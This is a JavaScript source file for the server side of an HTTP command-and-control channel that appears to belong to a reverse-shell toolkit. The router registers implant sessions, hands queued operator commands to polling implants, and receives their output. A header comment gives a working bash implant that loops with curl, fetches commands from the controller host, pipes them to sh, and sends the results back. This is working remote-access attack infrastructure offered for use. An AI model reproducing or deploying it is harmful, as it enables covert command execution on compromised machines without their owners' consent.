import crypto from "node:crypto";
import express from "express";
import config from "../config.js";
import { registry } from "../core/registry.js";
import { log } from "../core/log.js";

// HTTP webshell transport: for targets that can only reach out over HTTP(S).
// The implant beacons to the same Express server — no raw socket involved.
//
//   GET  /webshell/register?token=...  -> mint a session id (text)
//   GET  /webshell/:id/poll            -> long-poll for queued stdin (bytes)
//   POST /webshell/:id/output          -> implant posts raw command output
//
// All three endpoints require the shared BUILD_TOKEN (header X-RSL-Token or
// query token) so random scanners cannot mint sessions or poll existing ones.
//
// Reference bash implant:
//   H=http://HOST:8080; T=BUILD_TOKEN
//   ID=$(curl -s "$H/webshell/register?token=$T")
//   while :; do
//     C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")
//     [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)
//     curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"
//   done
export function webshellRouter() {
  const router = express.Router();
  const states = new Map(); // sessionId -> { queue, waiter, timer, token }

  const getToken = (req) =>
    String(req.headers["x-rsl-token"] || req.query.token || "");

  const tokenOk = (token) => {
    const expected = config.BUILD_TOKEN;
    if (!expected || !token) return false;
    if (token.length !== expected.length) return false;
    return crypto.timingSafeEqual(
      Buffer.from(token, "utf8"),
      Buffer.from(expected, "utf8")
    );
  };

  if (!config.ENABLE_WEBSHELL) return router;

  const touch = (id) => {
    const st = states.get(id);
    if (!st) return;
    clearTimeout(st.timer);
    st.timer = setTimeout(() => {
      const session = registry.get(id);
      if (session) session.markExit();
    }, config.WEBSHELL_TIMEOUT);
  };

  const flush = (id, res) => {
    const st = states.get(id);
    if (!st) return res.end();
    const buf = st.queue.length ? Buffer.concat(st.queue.splice(0)) : Buffer.alloc(0);
    res.setHeader("Content-Type", "application/octet-stream");
    res.end(buf);
  };

  router.get("/register", (req, res) => {
    if (!config.BUILD_TOKEN) {
      return res.status(404).json({ error: "BUILD_TOKEN not set" });
    }
    const token = getToken(req);
    if (!tokenOk(token)) {
      return res.status(403).end();
    }

    const remote = req.ip || req.socket.remoteAddress || "unknown";

    let session;
    const backend = {
      write: (buf) => {
        const st = states.get(session.id);
        if (!st) return;
        st.queue.push(buf);
        if (st.waiter) {
          const { res: heldRes, timer } = st.waiter;
          clearTimeout(timer);
          st.waiter = null;
          flush(session.id, heldRes);
        }
      },
      resize: () => {}, // half-duplex HTTP: no live PTY resize
      close: () => {
        const st = states.get(session.id);
        if (st && st.waiter) {
          try {
            st.waiter.res.end();
          } catch {
            /* ignore */
          }
        }
      },
    };

    session = registry.create({ transport: "webshell", remote, backend });
    states.set(session.id, { queue: [], waiter: null, timer: null, token });
    touch(session.id);
    log.info("webshell registered", { sessionId: session.id, remote });

    session.on("exit", () => {
      log.info("webshell session closed", { sessionId: session.id, remote });
      const st = states.get(session.id);
      if (st) clearTimeout(st.timer);
      states.delete(session.id);
    });

    res.type("text/plain").send(session.id);
  });

  router.get("/:id/poll", (req, res) => {
    const { id } = req.params;
    const st = states.get(id);
    const session = registry.get(id);
    if (!st || !session || !session.alive || !tokenOk(getToken(req))) {
      return res.status(410).end();
    }

    touch(id);

    if (st.queue.length) return flush(id, res);

    // Hold the request open until stdin arrives or the poll window elapses.
    const timer = setTimeout(() => {
      if (st.waiter && st.waiter.res === res) {
        st.waiter = null;
        flush(id, res);
      }
    }, config.WEBSHELL_POLL_MS);

    st.waiter = { res, timer };
    res.on("close", () => {
      if (st.waiter && st.waiter.res === res) {
        clearTimeout(timer);
        st.waiter = null;
      }
    });
  });

  router.post(
    "/:id/output",
    express.raw({ type: () => true, limit: "16mb" }),
    (req, res) => {
      const { id } = req.params;
      const session = registry.get(id);
      if (!session || !session.alive || !tokenOk(getToken(req))) {
        return res.status(410).end();
      }
      touch(id);
      if (req.body && req.body.length) session.push(req.body);
      res.end();
    }
  );

  return router;
}
